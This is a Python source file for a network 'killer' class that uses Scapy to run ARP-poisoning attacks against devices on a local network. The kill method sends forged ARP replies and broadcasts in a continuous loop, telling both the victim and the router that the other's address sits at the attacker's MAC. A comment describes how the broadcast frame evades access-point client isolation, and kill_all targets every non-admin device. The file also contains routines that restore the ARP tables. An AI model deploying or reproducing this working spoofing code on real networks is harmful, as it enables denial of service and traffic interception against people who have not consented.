from scapy.all import ARP, Ether, sendp
from time import sleep
from models.device import Device
from tools.utils import threaded, get_default_iface
from constants import *

class Killer:
    def __init__(self, router=DUMMY_ROUTER):
        self.iface = get_default_iface()
        self.router = router
        self.killed: dict[str, Device] = {}
        self.storage: dict[str, Device] = {}

    @threaded
    def kill(self, victim: Device, wait_after=1):
        """
        Spoofing victim - ARP poisoning
        """
        if victim.mac in self.killed:
            print(victim.mac, 'is already killed.')
            return

        # An offline row can be marked as killed so the user's requested state
        # is retained, but do not transmit using stale IP/MAC information.
        if not getattr(victim, 'online', True):
            self.killed[victim.mac] = victim
            print(f'[Killer] Queued {victim.mac}; it will be applied when the device returns.')
            return

        if self.iface.name == 'NULL':
            print(f'[Killer] Refusing to kill {victim.mac} — no valid interface resolved.')
            return

        self.killed[victim.mac] = victim

        # Get your own MAC address
        my_mac = self.iface.mac

        # Cheat Victim: Tell victim that router's IP is at YOUR MAC (unicast reply)
        to_victim = Ether(dst=victim.mac)/ARP(
            op=2,                    # ARP Reply
            psrc=self.router.ip,     # Router's IP
            hwsrc=my_mac,           # YOUR MAC (the spoof)
            hwdst=victim.mac,       # Victim's MAC
            pdst=victim.ip          # Victim's IP
        )

        # Same claim, but broadcast — some APs with client/band isolation
        # only drop direct unicast frames between clients while still
        # flooding broadcast frames, so this can reach victims that the
        # unicast reply above can't.
        to_victim_broadcast = Ether(dst=GLOBAL_MAC)/ARP(
            op=1,                    # ARP Request (gratuitous-style)
            psrc=self.router.ip,     # Router's IP
            hwsrc=my_mac,           # YOUR MAC (the spoof)
            hwdst=GLOBAL_MAC,
            pdst=victim.ip
        )

        print('to_victim but all in string:')
        print(to_victim.summary())

        # Cheat Router: Tell router that victim's IP is at YOUR MAC
        to_router = Ether(dst=self.router.mac)/ARP(
            op=2,                    # ARP Reply
            psrc=victim.ip,          # Victim's IP
            hwsrc=my_mac,           # YOUR MAC (the spoof)
            hwdst=self.router.mac,   # Router's MAC
            pdst=self.router.ip     # Router's IP
        )

        print('to_router but all in string:')
        print(to_router.summary())
        print('Interface:', self.iface.name)
        print('killed', victim.mac)

        while victim.mac in self.killed and self.iface.name != 'NULL':
            # Send packets to both victim and router
            sendp(to_victim, iface=self.iface.name, verbose=0)
            sendp(to_victim_broadcast, iface=self.iface.name, verbose=0)
            sendp(to_router, iface=self.iface.name, verbose=0)
            # print('0000 ->', victim.mac, 'spoofed')
            sleep(wait_after)

    @threaded
    def unkill(self, victim: Device):
        """
        Unspoofing victim - Restore ARP cache to original state
        """
        self.killed.pop(victim.mac, None)  # Safe pop with default

        # Offline records remain actionable, but stale addresses must not be
        # used to send restoration packets to a possibly different host.
        if not getattr(victim, 'online', True):
            print(f'[Killer] Cleared queued kill state for offline device {victim.mac}.')
            return

        # Fix Victim: Tell victim the router's REAL MAC
        to_victim = Ether(dst=victim.mac)/ARP(
            op=2,                        # ARP Reply (not request)
            psrc=self.router.ip,         # Router's IP
            hwsrc=self.router.mac,       # Router's REAL MAC
            hwdst=victim.mac,            # Victim's MAC
            pdst=victim.ip               # Victim's IP
        )

        # Fix Router: Tell router the victim's REAL MAC
        to_router = Ether(dst=self.router.mac)/ARP(
            op=2,                        # ARP Reply (not request)
            psrc=victim.ip,              # Victim's IP
            hwsrc=victim.mac,            # Victim's REAL MAC
            hwdst=self.router.mac,       # Router's MAC
            pdst=self.router.ip          # Router's IP
        )

        if self.iface.name != 'NULL':
            # Send multiple packets to ensure cache is updated
            print(f'Restoring ARP cache for {victim.mac}')
            for _ in range(5):  # Send 5 times for reliability
                sendp(to_victim, iface=self.iface.name, verbose=0)
                sendp(to_router, iface=self.iface.name, verbose=0)
                sleep(0.1)  # Small delay between sends

            print(f'Restored ARP cache for {victim.mac}')

        print('unkilled', victim.mac)

    def kill_all(self, device_list: list[Device], exclude_macs: set = frozenset()):
        """
        Safely kill all devices
        """
        for device in device_list[:]:
            if device.admin or device.mac in exclude_macs:
                continue
            if device.mac not in self.killed:
                self.kill(device)

    def unkill_all(self):
        """
        Safely unkill all devices killed previously
        """
        for mac in dict(self.killed):
            self.killed.pop(mac)
            print('unkilled', mac)

    def store(self):
        """
        Save a copy of previously killed devices
        """
        self.storage = dict(self.killed)

    def release(self):
        """
        Remove the stored copy of killed devices
        """
        self.storage = {}

    def rekill_stored(self, new_devices: list[Device], exclude_macs: set = frozenset()):
        """
        Restore prior kill state, but only transmit poison packets to devices
        that are currently reachable. Offline entries retain the queued state.
        """
        by_mac = {device.mac: device for device in new_devices}
        for _, old in self.storage.items():
            current = by_mac.get(old.mac)
            if current is None:
                old.online = False
                print(f'Updating with offline device: {old}')
                new_devices.append(old)
                by_mac[old.mac] = old
                current = old
            else:
                # Keep the stored state aligned with the latest discovered row.
                old.ip = current.ip
                old.hostname = getattr(current, 'hostname', '')
                old.name = current.name
                old.online = current.online

            if old.mac in exclude_macs:
                continue

            if not current.online:
                self.killed[current.mac] = current
                continue

            self.kill(current)